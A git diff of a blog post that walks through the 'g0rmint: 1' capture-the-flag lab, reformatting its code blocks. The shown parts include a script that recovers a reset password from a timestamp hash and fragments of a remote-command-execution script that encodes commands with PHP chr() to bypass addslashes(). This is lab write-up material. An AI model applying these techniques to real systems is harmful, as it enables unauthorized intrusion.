@@ -1,6 +1,6 @@
 ---
 layout: post
-last_modified_at: 2018-08-03 17:52:45 +0000
+last_modified_at: 2018-08-04 23:56:02 +0000
 title: "g0rmint: 1 Walkthrough"
 subtitle: "Will the Real Gormint Aunty Please Stand Up?"
 category: Walkthrough
@@ -199,15 +199,16 @@ The email address and username are correct.
 
 I wrote `reset.sh` to simplify the process of getting the "new" password in plaintext.
 
-{% highlight bash linenos %}
-# cat reset.sh
+<div class="filename"><span>reset.sh</span></div>
+```bash
 #!/bin/bash
 
 echo -n "$1" | sha1sum | cut -d' ' -f1 | cut -c1-20
 
 # ./reset.sh "Friday 2nd of February 2018 02:08:53 PM"
 30e1a63a8968b727f276
-{% endhighlight %}
+```
+
 ![access](/assets/images/posts/g0rmint-1-walkthrough/g0rmint-13.png)
 
 The password reset works.
@@ -230,8 +231,8 @@ When authentication fails, a PHP file at `s3cr3t-dir3ct0ry-f0r-l0gs` logs the va
 
 I wrote `exploit.sh`, a `bash` script to automate what I've described—to execute remote commands on the host.
 
-{% highlight bash linenos %}
-# cat exploit.sh
+<div class="filename"><span>exploit.sh</span></div>
+```bash
 #!/bin/bash
 
 HOST=192.168.198.130
@@ -286,7 +287,7 @@ exploit
 
 # remove cookie jar
 rm -rf cookie
-{% endhighlight %}
+```
 
 The workhorse of the script is the `encode()` function. This function turns each ASCII characters of the command string into their ordinals. Each ordinal will go into the PHP `chr()` function and concatenate back as a string. This is to bypass [`addslashes()`](http://php.net/manual/en/function.addslashes.php){: .external}{: target="_blank"} that is present in `config.php`.
 
